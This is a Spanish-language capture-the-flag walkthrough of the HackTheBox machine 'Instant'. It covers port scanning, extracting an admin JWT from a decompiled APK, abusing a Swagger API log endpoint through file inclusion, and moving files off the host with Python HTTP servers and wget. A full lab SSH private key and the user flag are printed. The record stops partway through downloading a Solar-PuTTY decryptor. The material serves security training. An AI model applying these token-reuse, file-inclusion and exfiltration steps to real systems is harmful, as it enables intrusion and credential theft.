---
hidden: true
noIndex: true
noRobotsIndex: true
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Copy of gzzcooinstant



<figure><img src="../../.gitbook/assets/Instant.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance

Realizaremos un reconocimiento con `Nmap` para ver los puertos que están expuestos en la máquina **`Instant`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.37 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 07:52 CET
Initiating SYN Stealth Scan at 07:52
Scanning 10.10.11.37 [65535 ports]
Discovered open port 22/tcp on 10.10.11.37
Discovered open port 80/tcp on 10.10.11.37
Completed SYN Stealth Scan at 07:52, 11.55s elapsed (65535 total ports)
Nmap scan report for 10.10.11.37
Host is up, received user-set (0.035s latency).
Scanned at 2025-01-20 07:52:00 CET for 12s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.66 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65540 (2.622MB)
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.37
	[*] Open ports: 22,80

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato `oN` y `oX` para posteriormente trabajar con ellos. Verificamos que al parecer se trata de una máquina Ubuntu que dispone de una página de `Apache` y el servicio `SSH`.

```bash
❯ nmap -sCV -p22,80 10.10.11.37 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 07:53 CET
Nmap scan report for instant.htb (10.10.11.37)
Host is up (0.055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Instant Wallet
|_http-server-header: Apache/2.4.58 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   100.00 ms 10.10.16.1
2   28.13 ms  instant.htb (10.10.11.37)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.10 seconds
```

Procederemos a transformar el archivo generado `targetedXML` en un archivo `HTML`. Posteriormente, montaremos un servidor web para visualizarlo.

```bash
❯ xsltproc targetedXML > index.html
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../.gitbook/assets/imagen (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Web Enumeration

Accederemos a [http://instant.htb ](http://instant.htb)y verificamos que en el sitio web nos aparece un botón de `Download now` en el cual haciendo hovering verificamos que se trata de un archivo llamado `instant.apk`. Nos descargaremos el archivo `APK` para verificar su uso o analizarlo.

<figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Analyzing APK binary with JADX-GUI

Una vez descargado el archivo `instant.apk`, el siguiente paso será analizar el binario. Esto lo podemos hacer de dos maneras, a través de la herramienta `apktool` que nos descomprimirá el `APK` en nuestro directorio actual para posteriormente revisar los archivos que nos genere.

La otra opción, la más recomendable, es hacer uso de la herramienta `jadx-gui`, que nos permitirá realizar lo mismo pero a través de una interfaz GUI.

```bash
❯ ls -l
.rw-rw-r-- kali kali 5.2 MB Mon Jan 20 07:55:11 2025  instant.apk

❯ apktool d instant.apk
I: Using Apktool 2.6.0 on instant.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/kali/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
I: Copying META-INF/services directory

❯ jadx-gui
```

Analizando el código fuente de la aplicación, nos encontramos en `AdminActivities` lo que parece ser una clave `Authorization` y un subdominio llamado `mywalletv1.instant.htb`.

<figure><img src="../../.gitbook/assets/3934_vmware_pKxJnlVKJy.png" alt=""><figcaption></figcaption></figure>

Nos guardaremos con esta clave del usuario `admin`, para verificar si nos puede servir más adelante.

```bash
❯ cat admin_authorization
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
```

Revisando el siguiente archivo que se encuentra en la ruta `res/xml/network_security_config.xml` nos encontramos con la siguiente información. Parece tratarse de subdominios.

<figure><img src="../../.gitbook/assets/imagen (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Añadiremos estos nuevos subdominios en nuestro archivo `/etc/hosts`.

```bash
❯ cat /etc/hosts | grep 10.10.11.37
10.10.11.37 instant.htb mywalletv1.instant.htb swagger-ui.instant.htb
```

## Initial Access

### Using Swagger API&#x20;

Al acceder a [http://mywalletv1.instant.htb](http://mywalletv1.instant.htb) no logramos visualizar nada en la página web.

Por otro lado, en la página [http://swagger-ui.instant.htb](http://swagger-ui.instant.htb) logramos acceder a una página web que se trata de una página web de `Swagger`.

{% hint style="info" %}
Swagger es un conjunto de herramientas y especificaciones diseñadas para ayudar a crear, documentar y consumir **APIs RESTful**.
{% endhint %}

A través del siguiente enlace, podemos consultar cómo funciona el `Swagger`.

{% embed url="https://swagger.io/docs/" %}

<figure><img src="../../.gitbook/assets/imagen (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Revisando la página web, podemos verificar que han documentado cómo podemos registrarnos. En este caso, intentaremos registrarnos pare verificar qué podemos realizar.

<figure><img src="../../.gitbook/assets/imagen (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al intentar registrarnos, verificamos que nos muestran cómo podemos efectuar el registro a través de la API del sitio web, también nos demuestran los diferentes resultados que obtendríamos.

<figure><img src="../../.gitbook/assets/imagen (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Desde nuestra terminal, intentaremos registranos usando la API, verificamos que nos aparece conforme el registro se ha realizado correctamente.

```bash
❯ curl -X POST "http://swagger-ui.instant.htb/api/v1/register" -H  "accept: application/json" -H  "Content-Type: application/json" -d "{  \"email\": \"gzzcoojr@instant.htb\",  \"password\": \"Gzzcoo123\",  \"pin\": \"12345\",  \"username\": \"gzzcoojr\"}"
{"Description":"User Registered! Login Now!","Status":201}
```

Por otro lado, también verificamos que hay documentación de cómo utilizar la API para iniciar sesión con ella. Al darle a la opción de `Execute` nos deberá proporcionar la información del comando a utilizar.

<figure><img src="../../.gitbook/assets/imagen (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

El comando que nos proporcinó es el siguiente, en el cual al ejecutarlo, nos proporciona un `Access-Token` de nuestro usuario.

```bash
❯ curl -X POST "http://swagger-ui.instant.htb/api/v1/login" -H  "accept: application/json" -H  "Content-Type: application/json" -d "{  \"password\": \"Gzzcoo123\",  \"username\": \"gzzcoo\"}"
{"Access-Token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Mywicm9sZSI6Imluc3RhbnRpYW4iLCJ3YWxJZCI6ImQzZmUzMjg5LTY0YWMtNDM5Zi1hN2NlLTUzMzZlNmY1ZjhhNCIsImV4cCI6MTczNzM2MzI3Mn0.hzRXsObNvUNqdM5UFvp_2lQTvDQ2XVkSBkWIeYbx9Fg","Status":201}
```

Revisaremos la documentación para visualizar nuestro perfil. Para visualizar nuestro perfil, lo podemos hacer a través de `cURL` o accediendo a la URL que se nos menciona.

<figure><img src="../../.gitbook/assets/imagen (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

En este caso, utilizamos `BurpSuite` para enviar la solicitud modificado. En este caso, añadimos el apartado de `Authorization` y la clave del `Access-Token` que obtuvimos anteriormente.

Al enviar la solicitud, verificamos que en el resultado de la respuesta por parte del servidor, nos indica que somos el usuario que hemos creado.

<figure><img src="../../.gitbook/assets/3941_vmware_G8Pyju3JZx.png" alt=""><figcaption></figcaption></figure>

Dado que el `Access-Token` que tenemos actualmente parece ser muy similar al del usuario `admin`, que obtuvimos anteriormente al analizar el archivo `APK`, el siguiente paso fue modificar el campo `Authorization` con el `Access-Token` del usuario `admin` y verificar la respuesta del servidor.

En este caso, comprobamos que el servidor ha aceptado el `Access-Token`. Por lo tanto, es válido y el usuario que tenemos ahora es el usuario `instantAdmin`.

<figure><img src="../../.gitbook/assets/3942_vmware_KVOVMj2DlX (1).png" alt=""><figcaption></figcaption></figure>

### Performing Local File Inclusion with Swagger API

En la documentación de `Swagger` del sitio web  [http://swagger-ui.instant.htb](http://swagger-ui.instant.htb) logramos encontrar documentación relacionada a revisar los logs.

Desde BurpSuite interceptaremos la solicitud al acceder a [http://swagger-ui.instant.htb/api/v1/admin/view/logs](http://swagger-ui.instant.htb/api/v1/admin/view/logs), asignaremos el `Authorization` del usuario `instantAdmin` y comprobaremos que nos aparece en el directorio `/home/shirohige/logs/` de un archivo llamado `1.log`.

<figure><img src="../../.gitbook/assets/imagen (8) (1).png" alt=""><figcaption></figcaption></figure>

En la documentación del sitio web, también verificamos que nos proporcionan la documentación de cómo leer un log. En este caso, indicaremos que queremos leer el archivo encontrado `1.log` y nos mostrará cómo leerlo a través del API.

<figure><img src="../../.gitbook/assets/imagen (9) (1).png" alt=""><figcaption></figcaption></figure>

Desde BurpSuite, volveremos a modificar la solicitud para  leer el archivo mencionado. Por parte de la respuesta del servidor, logramos leer el archivo mencionado.

<figure><img src="../../.gitbook/assets/imagen (10) (1).png" alt=""><figcaption></figcaption></figure>

Por lo tanto, lo que decidimos intentar realizar es leer a través de un _**Local File Inclusion (LFI)**_ la clave privada SSH del usuario `shirohige`. Comprobamos que hemos podido leer la clave privada en el resultado de la respuesta del servidor.

<figure><img src="../../.gitbook/assets/imagen (11) (1).png" alt=""><figcaption></figcaption></figure>

El resultado al copiarlo en un archivo, dispone de varios carácteres que deberemos de eliminar para que tenga el formato adecuado. Por lo tanto, a través de expresiones regulares modificaremos el archivo,

<pre class="language-bash"><code class="lang-bash">❯ cat id_rsa
"-----BEGIN OPENSSH PRIVATE KEY-----\n","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\n","-----END OPENSSH PRIVATE KEY-----\n"
<strong>
</strong><strong>❯ cat id_rsa | sed 's/\\n//g' | tr -d '"' | sed 's/,/\n/g' | sponge id_rsa
</strong>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEApbntlalmnZWcTVZ0skIN2+Ppqr4xjYgIrZyZzd9YtJGuv/w3GW8B
nwQ1vzh3BDyxhL3WLA3jPnkbB8j4luRrOfHNjK8lGefOMYtY/T5hE0VeHv73uEOA/BoeaH
dAGhQuAAsDj8Avy1yQMZDV31PHcGEDu/0dU9jGmhjXfS70gfebpII3js9OmKXQAFc2T5k/
5xL+1MHnZBiQqKvjbphueqpy9gDadsiAvKtOA8I6hpDDLZalak9Rgi+BsFvBsnz244uCBY
8juWZrzme8TG5Np6KIg1tdZ1cqRL7lNVMgo7AdwQCVrUhBxKvTEJmIzR/4o+/w9njJ3+WF
uaMbBzOsNCAnXb1Mk0ak42gNLqcrYmupUepN1QuZPL7xAbDNYK2OCMxws3rFPHgjhbqWPS
jBlC7kaBZFqbUOA57SZPqJY9+F0jttWqxLxr5rtL15JNaG+rDfkRmmMzbGryCRiwPc//AF
Oq8vzE9XjiXZ2P/jJ/EXahuaL9A2Zf9YMLabUgGDAAAFiKxBZXusQWV7AAAAB3NzaC1yc2
EAAAGBAKW57ZWpZp2VnE1WdLJCDdvj6aq+MY2ICK2cmc3fWLSRrr/8NxlvAZ8ENb84dwQ8
sYS91iwN4z55GwfI+JbkaznxzYyvJRnnzjGLWP0+YRNFXh7+97hDgPwaHmh3QBoULgALA4
/AL8tckDGQ1d9Tx3BhA7v9HVPYxpoY130u9IH3m6SCN47PTpil0ABXNk+ZP+cS/tTB52QY
kKir426YbnqqcvYA2nbIgLyrTgPCOoaQwy2WpWpPUYIvgbBbwbJ89uOLggWPI7lma85nvE
xuTaeiiINbXWdXKkS+5TVTIKOwHcEAla1IQcSr0xCZiM0f+KPv8PZ4yd/lhbmjGwczrDQg
J129TJNGpONoDS6nK2JrqVHqTdULmTy+8QGwzWCtjgjMcLN6xTx4I4W6lj0owZQu5GgWRa
m1DgOe0mT6iWPfhdI7bVqsS8a+a7S9eSTWhvqw35EZpjM2xq8gkYsD3P/wBTqvL8xPV44l
2dj/4yfxF2obmi/QNmX/WDC2m1IBgwAAAAMBAAEAAAGARudITbq/S3aB+9icbtOx6D0XcN
SUkM/9noGckCcZZY/aqwr2a+xBTk5XzGsVCHwLGxa5NfnvGoBn3ynNqYkqkwzv+1vHzNCP
OEU9GoQAtmT8QtilFXHUEof+MIWsqDuv/pa3vF3mVORSUNJ9nmHStzLajShazs+1EKLGNy
nKtHxCW9zWdkQdhVOTrUGi2+VeILfQzSf0nq+f3HpGAMA4rESWkMeGsEFSSuYjp5oGviHb
T3rfZJ9w6Pj4TILFWV769TnyxWhUHcnXoTX90Tf+rAZgSNJm0I0fplb0dotXxpvWtjTe9y
1Vr6kD/aH2rqSHE1lbO6qBoAdiyycUAajZFbtHsvI5u2SqLvsJR5AhOkDZw2uO7XS0sE/0
cadJY1PEq0+Q7X7WeAqY+juyXDwVDKbA0PzIq66Ynnwmu0d2iQkLHdxh/Wa5pfuEyreDqA
wDjMz7oh0APgkznURGnF66jmdE7e9pSV1wiMpgsdJ3UIGm6d/cFwx8I4odzDh+1jRRAAAA
wQCMDTZMyD8WuHpXgcsREvTFTGskIQOuY0NeJz3yOHuiGEdJu227BHP3Q0CRjjHC74fN18
nB8V1c1FJ03Bj9KKJZAsX+nDFSTLxUOy7/T39Fy45/mzA1bjbgRfbhheclGqcOW2ZgpgCK
gzGrFox3onf+N5Dl0Xc9FWdjQFcJi5KKpP/0RNsjoXzU2xVeHi4EGoO+6VW2patq2sblVt
pErOwUa/cKVlTdoUmIyeqqtOHCv6QmtI3kylhahrQw0rcbkSgAAADBAOAK8JrksZjy4MJh
HSsLq1bCQ6nSP+hJXXjlm0FYcC4jLHbDoYWSilg96D1n1kyALvWrNDH9m7RMtS5WzBM3FX
zKCwZBxrcPuU0raNkO1haQlupCCGGI5adMLuvefvthMxYxoAPrppptXR+g4uimwp1oJcO5
SSYSPxMLojS9gg++Jv8IuFHerxoTwr1eY8d3smeOBc62yz3tIYBwSe/L1nIY6nBT57DOOY
CGGElC1cS7pOg/XaOh1bPMaJ4Hi3HUWwAAAMEAvV2Gzd98tSB92CSKct+eFqcX2se5UiJZ
n90GYFZoYuRerYOQjdGOOCJ4D/SkIpv0qqPQNulejh7DuHKiohmK8S59uMPMzgzQ4BRW0G
HwDs1CAcoWDnh7yhGK6lZM3950r1A/RPwt9FcvWfEoQqwvCV37L7YJJ7rDWlTa06qHMRMP
5VNy/4CNnMdXALx0OMVNNoY1wPTAb0x/Pgvm24KcQn/7WCms865is11BwYYPaig5F5Zo1r
bhd6Uh7ofGRW/5AAAAEXNoaXJvaGlnZUBpbnN0YW50AQ==
-----END OPENSSH PRIVATE KEY-----
</code></pre>

### Accessing via SSH with id\_rsa key

Le daremos los permisos necesarios al archivo `id_rsa` para poder utilizarlo y autenticarnos al SSH con el usuario sin proporcionarle las credenciales de este mismo. Verificamos que podemos visualizar la flag de **user.txt**.

```bash
❯ chmod 600 id_rsa

❯ ssh -i id_rsa shirohige@10.10.11.37
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
shirohige@instant:~$ cat user.txt 
e811742fcd1a0d2d3d526735410ddfe8
```

## Privilege Escalation

### Analyzing a database file

Navegando en las diferentes rutas, nos encontramos con un archivo de una base de datos llamada `instant.db`. Este archivo lo compartiremos a través de un servidor web con Python, dado que la máquina dispone del binario.

```bash
shirohige@instant:~/projects/mywallet/Instant-Api/mywallet/instance$ ls -l
total 36
-rw-r--r-- 1 shirohige shirohige 36864 Jan 20 00:33 instant.db
shirohige@instant:~/projects/mywallet/Instant-Api/mywallet/instance$ which python3
/usr/bin/python3
shirohige@instant:~/projects/mywallet/Instant-Api/mywallet/instance$ python3 -m http.server 6969
Serving HTTP on 0.0.0.0 port 6969 (http://0.0.0.0:6969/) ...
```

Desde nuestra máquina atacante, nos descargaremos el archivo y lo abriremos con `sqlitebrowser`.

```bash
❯ wget 10.10.11.37:6969/instant.db
--2025-01-20 08:28:38--  http://10.10.11.37:6969/instant.db
Conectando con 10.10.11.37:6969... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 36864 (36K) [application/octet-stream]
Grabando a: «instant.db»

instant.db                                                100%[==================================================================================================================================>]  36,00K  --.-KB/s    en 0,08s   

2025-01-20 08:28:39 (467 KB/s) - «instant.db» guardado [36864/36864]

❯ ls -l instant.db
.rw-rw-r-- kali kali 36 KB Mon Jan 20 01:33:34 2025  instant.db

❯ sqlitebrowser instant.db
```

Al revisar la base de atos, nos encontramos con los diferentes usuarios del sitio web. En este caso el usuario que nos interesaría es el de `instantAdmin` para verificar si estas credenciales nos servirían para el usuario `root`.

En este caso, la contraseña se encuentra en un formato hash `pbkdf2:sha256`, intentamos crackear el hash pero nos tomaría bastante tiempo al tratarse de un hash complejo.

<figure><img src="../../.gitbook/assets/3948_vmware_8tJu5rrwRz.png" alt=""><figcaption></figcaption></figure>

### Recovering Credentials from Solar-PuTTY Backup (sessions-backup.dat)

Revisando el directorio `/opt`, nos encontramos con un directorio `backup` que contenía un archivo llamado `sessions-backup.dat`, es decir, un archivo de backup de la sesión de `Solar-PuTTY`.&#x20;

Transferiremos este archivo a nuestra Kali atacante.

```bash
shirohige@instant:/opt/backups/Solar-PuTTY$ ls -l
total 4
-rw-r--r-- 1 shirohige shirohige 1100 Sep 30 11:38 sessions-backup.dat
shirohige@instant:/opt/backups/Solar-PuTTY$ python3 -m http.server 6969
Serving HTTP on 0.0.0.0 port 6969 (http://0.0.0.0:6969/) ...
```

Nos descargaremos el archivo de backup y verificaremos que lo disponemos en nuestro equipo local.

```bash
❯ wget 10.10.11.37:6969/sessions-backup.dat
--2025-01-20 08:41:34--  http://10.10.11.37:6969/sessions-backup.dat
Conectando con 10.10.11.37:6969... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1100 (1,1K) [application/octet-stream]
Grabando a: «sessions-backup.dat»

sessions-backup.dat                                       100%[==================================================================================================================================>]   1,07K  --.-KB/s    en 0,03s   

2025-01-20 08:41:34 (42,3 KB/s) - «sessions-backup.dat» guardado [1100/1100]

❯ ls -l sessions-backup.dat
.rw-rw-r-- kali kali 1.1 KB Mon Sep 30 13:38:26 2024  sessions-backup.dat
```

Al revisar el archivo, verificamos que no es legible a simple vista.

```bash
❯ cat sessions-backup.dat
ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJwjMCwhDGZzNRr0fNJMlLWfpbdO7l2fEbSl/OzVAmNq0YO94RBxg9p4pwb4upKiVBhRY22HIZFzy6bMUw363zx6lxM4i9kvOB0bNd/4PXn3j3wVMVzpNxuKuSJOvv0fzY/ZjendafYt1Tz1VHbH4aHc8LQvRfW6Rn+5uTQEXyp4jE+ad4DuQk2fbm9oCSIbRO3/OKHKXvpO5Gy7db1njW44Ij44xDgcIlmNNm0m4NIo1Mb/2ZBHw/MsFFoq/TGetjzBZQQ/rM7YQI81SNu9z9VVMe1k7q6rDvpz1Ia7JSe6fRsBugW9D8GomWJNnTst7WUvqwzm29dmj7JQwp+OUpoi/j/HONIn4NenBqPn8kYViYBecNk19Leyg6pUh5RwQw8Bq+6/OHfG8xzbv0NnRxtiaK10KYh++n/Y3kC3t+Im/EWF7sQe/syt6U9q2Igq0qXJBF45Ox6XDu0KmfuAXzKBspkEMHP5MyddIz2eQQxzBznsgmXT1fQQHyB7RDnGUgpfvtCZS8oyVvrrqOyzOYl8f/Ct8iGbv/WO/SOfFqSvPQGBZnqC8Id/enZ1DRp02UdefqBejLW9JvV8gTFj94MZpcCb9H+eqj1FirFyp8w03VHFbcGdP+u915CxGAowDglI0UR3aSgJ1XIz9eT1WdS6EGCovk3na0KCz8ziYMBEl+yvDyIbDvBqmga1F+c2LwnAnVHkFeXVua70A4wtk7R3jn8+7h+3Evjc1vbgmnRjIp2sVxnHfUpLSEq4oGp3QK+AgrWXzfky7CaEEEUqpRB6knL8rZCx+Bvw5uw9u81PAkaI9SlY+60mMflf2r6cGbZsfoHCeDLdBSrRdyGVvAP4oY0LAAvLIlFZEqcuiYUZAEgXgUpTi7UvMVKkHRrjfIKLw0NUQsVY4LVRaa3rOAqUDSiOYn9F+Fau2mpfa3c2BZlBqTfL9YbMQhaaWz6VfzcSEbNTiBsWTTQuWRQpcPmNnoFN2VsqZD7d4ukhtakDHGvnvgr2TpcwiaQjHSwcMUFUawf0Oo2+yV3lwsBIUWvhQw2g=%                                                 ❯ catnp sessions-backup.dat | base64 -d; echo
d�D��*�>\�ȹ8�П�cȫ&�qv�%a9D���
                            C��F�4�%-g�mӻ�g�m);5@�ڴ`�xD`��)��.���X�a�d\���~�����"�K�F�w�^}��LW:M��H���G�c�czwZ}�uO=U��hw<-
                                                                                                                           �}n���nMʞ#��;��gۛ�H��;�(r����oY�[���cM�I�4�51��d�����Lg��0YA�3�#�R6�s�UL{Y;��þ��!��I�F�n�oC�j&X�gN�{YK��9��٣�0�㔦�����4��5�������b`�6M}-��!���j�����6�����ؚ+]
b���7�-����a{���+zSڶ"
��rA�NǥûB�~�̠l�A
7Tq[pgO��u�,F��R4Q�Ju\��y=Vu.�*/�y�Р��8�0%�+�Ȇü���E�͋�p'Tyyunk��@`Y���!�ޝ�CF�6Qן��-oI�_ LX���ip&�窏Qb�\��
                                                               d��ϻ��ľ75��&�ȧk�q�R���(��+� �e�~L�	�J�D���+d,~�9�n�S���=JV>�I�~W���m��p�
                                                                                                                                             �AJ�]�eo�(cB��ȔVD�ˢaF@�R���K�T�F�� �����V8-TZkz��J#���~������́fPjM��a����ϥ_�Ąl��œM
                                                                                                                                                                                                                              �E
\>cg�SvVʙ�x�Hmj@�����"�K
                         PU���o�Wyp�Z�P�h
```

Revisando en Internet, nos encontramos con el siguiente script en Python que se encarga de desencriptar los archivos de sesiones de `Solar-PuTTY`.

{% embed url="https://dimont-gattsu.github.io/SolarPuttyDecrypterPy/decrypt2.py" %}

```bash
❯ wget https://dimont-gattsu.github.io/SolarPuttyDecrypterPy/decrypt2.py
--2025-01-20 08:43:32--  https://dimont-gattsu.github.io/SolarPuttyDecrypterPy/decrypt2.py
Resolviendo dimont-gattsu.github.io (dimont-gattsu.github.io)... 185.199.108.153, 185.199.109.153, 185.199.110.153, ...
Conectando con dimont-gattsu.github.io (dimont-gattsu.github.io)[185.199.108.153]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 2824 (2,8K) [application/octet-stream]
Grabando a: «decrypt2.py»

